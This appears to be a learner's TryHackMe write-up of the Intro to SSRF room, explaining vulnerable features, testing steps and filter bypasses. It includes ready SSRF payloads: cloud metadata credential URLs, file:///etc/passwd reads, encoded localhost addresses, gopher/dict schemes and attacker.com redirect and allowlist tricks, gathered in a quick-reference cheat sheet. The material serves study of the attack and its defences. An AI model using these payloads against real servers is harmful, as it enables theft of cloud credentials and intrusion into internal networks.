# TryHackMe — Intro to SSRF

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-SSRF-orange)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | Intro to SSRF |
| Path | Jr Penetration Tester → Web Application Vulnerabilities I |
| Tasks Completed | Task 1 — Task 5 (all, 100%) |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 1 | Introduction | ✅ Done |
| Task 2 | SSRF Examples | ✅ Done |
| Task 3 | Finding an SSRF | ✅ Done |
| Task 4 | Defeating Common SSRF Defenses | ✅ Done |
| Task 5 | SSRF Practical | ✅ Done |

---

## What is SSRF?

Server-Side Request Forgery (SSRF) occurs when an attacker tricks a server into making HTTP requests to an unintended location — often internal systems the attacker could never reach directly.

**The core idea:** The vulnerable server becomes a proxy for the attacker. Instead of the attacker connecting directly to an internal resource (which is blocked by network segmentation/firewalls), the application server makes the request on the attacker's behalf — and the server is trusted to access internal resources.

```
Attacker  →  Vulnerable App Server  →  Internal Resource (normally unreachable)
            (makes the request          (cloud metadata, internal API,
             on attacker's behalf)        admin panel, database)
```

---

## Task 2 — SSRF Examples

### Common vulnerable functionality

Any feature where the server fetches a URL on behalf of the user is a potential SSRF target:

| Feature | Why it's vulnerable |
|---------|---------------------|
| **Image/file upload by URL** | "Upload from URL" feature fetches whatever URL is provided |
| **PDF generators** | Often fetch external resources (images, stylesheets) to render |
| **Webhooks** | Server sends a request to a user-specified URL |
| **URL preview/unfurling** | Server fetches the URL to generate a link preview (like Slack/Discord previews) |
| **Import/export from URL** | "Import data from this link" features |
| **XML parsers (XXE-adjacent)** | XML external entities can trigger server-side requests |

### Real-world example

```
Feature: "Add profile picture from URL"

Normal use:
POST /profile/avatar
{"image_url": "https://example.com/photo.jpg"}

Malicious use:
POST /profile/avatar
{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

→ Server fetches the AWS metadata endpoint instead of an image
→ Response may leak cloud credentials
```

**What I learned:** SSRF is fundamentally about finding any place where the server makes outbound requests based on user input. The feature doesn't need to look "dangerous" — an innocent-looking "fetch a preview" or "upload by URL" function is exactly the kind of feature that hides SSRF.

---

## Task 3 — Finding an SSRF

### Where to look

```
1. Any parameter containing a URL, domain, or IP address
   ?url=, ?path=, ?dest=, ?redirect=, ?callback=, ?webhook=

2. File upload features with a "from URL" option

3. API integrations (e.g. "connect your webhook")

4. PDF/document generation features

5. Any feature that "previews" external content
```

### Testing methodology

```bash
# Step 1: Identify a parameter that accepts a URL
?image_url=https://example.com/test.jpg

# Step 2: Point it to your own server and monitor for a callback
?image_url=http://YOUR_IP:PORT/test

# Set up a listener to catch the request
nc -lvnp 8080

# Step 3: If you receive a connection, SSRF is confirmed
# Step 4: Pivot to internal targets
?image_url=http://localhost/admin
?image_url=http://169.254.169.254/latest/meta-data/
?image_url=http://internal-service:8080/
```

### High-value internal targets to test

| Target | Why it's valuable |
|--------|---------------------|
| `http://169.254.169.254/` (AWS) | Cloud metadata service — can leak IAM credentials |
| `http://metadata.google.internal/` (GCP) | Google Cloud metadata equivalent |
| `http://localhost` / `http://127.0.0.1` | Services only meant to be accessed from the server itself |
| `http://internal-hostname:port` | Internal services not exposed to the internet |
| `file:///etc/passwd` | Some SSRF implementations also allow file:// scheme |

**What I learned:** The cloud metadata endpoint (`169.254.169.254`) is the single highest-value SSRF target in modern cloud-hosted applications. A successful SSRF against this endpoint can leak temporary AWS credentials that grant far more access than the original web application vulnerability would suggest.

---

## Task 4 — Defeating Common SSRF Defenses

Applications often attempt to block SSRF with filters. This task covered how those filters are commonly bypassed.

### Defense 1: Blacklisting `localhost` / `127.0.0.1`

**Bypass techniques:**
```
http://127.0.0.1          → blocked
http://localhost          → blocked

# Alternate representations of the same address:
http://0.0.0.0
http://0
http://127.1
http://2130706433              # decimal representation of 127.0.0.1
http://0x7f.0x0.0x0.0x1        # hex representation
http://[::1]                   # IPv6 loopback
http://127.0.0.1.nip.io        # DNS resolving to 127.0.0.1
```

### Defense 2: Blacklisting internal IP ranges

**Bypass techniques:**
```
# DNS rebinding — domain resolves to internal IP after the check passes
# URL shorteners that redirect to internal IPs
http://bit.ly/malicious-redirect

# Using a redirect server you control:
http://attacker.com/redirect?to=http://169.254.169.254/
→ Server follows the redirect to the internal target
```

### Defense 3: Requiring a specific URL scheme (http/https only)

**Bypass techniques:**
```
# Case manipulation
HTTP://169.254.169.254/

# Alternate schemes if not properly restricted
gopher://internal-target:port/
dict://internal-target:port/
file:///etc/passwd
```

### Defense 4: Allowlisting specific domains

**Bypass techniques:**
```
# If the app checks the domain contains "example.com"
http://example.com.attacker.com/      # passes substring check, resolves to attacker
http://attacker.com/example.com       # path contains the string, not the domain
http://example.com@attacker.com/      # userinfo trick — browsers/some parsers go to attacker.com
```

**What I learned:** Every SSRF defense based on string matching or blacklisting has a bypass because there are many equivalent ways to represent the same address (decimal, hex, octal, IPv6, alternate domains that resolve to the same IP). The only robust defense is allowlisting at the network level combined with disabling unnecessary URL schemes — not pattern matching on the URL string itself.

---

## Task 5 — SSRF Practical

Applied the full methodology against a live vulnerable target.

### My testing process

```
1. Identified a "fetch URL" parameter in the application
2. Confirmed basic SSRF by pointing it to my own listener
   nc -lvnp 8080
   → received the callback, confirming the server makes outbound requests

3. Attempted to reach internal-only resources:
   ?url=http://localhost/admin
   ?url=http://127.0.0.1:8080/internal-api

4. Encountered a filter blocking "127.0.0.1" and "localhost"

5. Bypassed using alternate representation:
   ?url=http://0177.0.0.1/          (octal)
   ?url=http://2130706433/          (decimal)

6. Successfully accessed an internal admin endpoint not meant
   to be reachable from outside the network

7. Documented: parameter, bypass technique used, internal resource
   accessed, and what information/access it exposed
```

**Result:** Demonstrated that the SSRF allowed access to an internal service that should have been isolated from external users — a finding I documented with full reproduction steps.

---

## SSRF Attack Flow — Full Picture

```
1. Find a feature where the server fetches a URL on the user's behalf

2. Confirm SSRF exists:
   - Point the parameter at your own server/listener
   - Confirm you receive the callback

3. If filters exist, try bypass techniques:
   - Alternate IP representations (decimal, hex, octal, IPv6)
   - DNS tricks (domains resolving to internal IPs)
   - Redirect chains
   - Alternate URL schemes (gopher, file, dict)

4. Pivot to high-value internal targets:
   - Cloud metadata endpoints
   - Internal admin panels
   - Internal APIs and databases
   - Localhost-only services

5. Extract value:
   - Cloud credentials from metadata service
   - Internal data not meant to be public
   - Further pivot into the internal network
```

---

## Key Takeaways

- **SSRF turns the trusted server into an attacker's proxy** — the danger isn't the attacker's own access, it's the server's privileged network position being abused
- **Cloud metadata endpoints are the crown jewel target** — `169.254.169.254` should be the first thing tested once basic SSRF is confirmed on any cloud-hosted application
- **Blacklist-based defenses almost always have a bypass** — decimal/hex/octal IP encoding alone defeats most naive `127.0.0.1` string-matching filters
- **Any "fetch a URL" feature is a candidate** — image upload by URL, webhooks, PDF generators, and link previews are the most common places SSRF hides
- **A confirmed callback to your own listener is the proof** — before attempting internal pivoting, always first confirm the SSRF exists using infrastructure you control and can observe

---

## SSRF Testing Quick Reference

```bash
# Set up a listener to confirm SSRF
nc -lvnp 8080

# Basic confirmation payload
http://YOUR_IP:8080/ssrf-test

# Localhost bypass variations
http://127.0.0.1
http://0.0.0.0
http://0
http://127.1
http://2130706433
http://0x7f.0x0.0x0.0x1
http://[::1]

# Cloud metadata targets
http://169.254.169.254/latest/meta-data/                    # AWS
http://metadata.google.internal/computeMetadata/v1/         # GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure

# Allowlist bypass patterns
http://trusted.com.attacker.com/
http://trusted.com@attacker.com/
```

---

## Connection to My Learning Path

| This Room | Where it connects |
|-----------|---------------------|
| SSRF detection | PortSwigger SSRF Practitioner labs |
| Cloud metadata exploitation | Cloud security awareness (year 2 learning goal) |
| Filter bypass logic | Same evasion mindset as Nmap Advanced Port Scans room |
| Internal pivot value | Kill Chain — Actions on Objectives stage |

---

## Resources

- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks — SSRF bypass techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

---

## My Progress

- [x] CSRF Introduction
- [x] SQL Injection
- [x] XSS Introduction
- [x] Intro to SSRF ← *this writeup*
- [ ] Authentication, Access Control — continuing PortSwigger

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
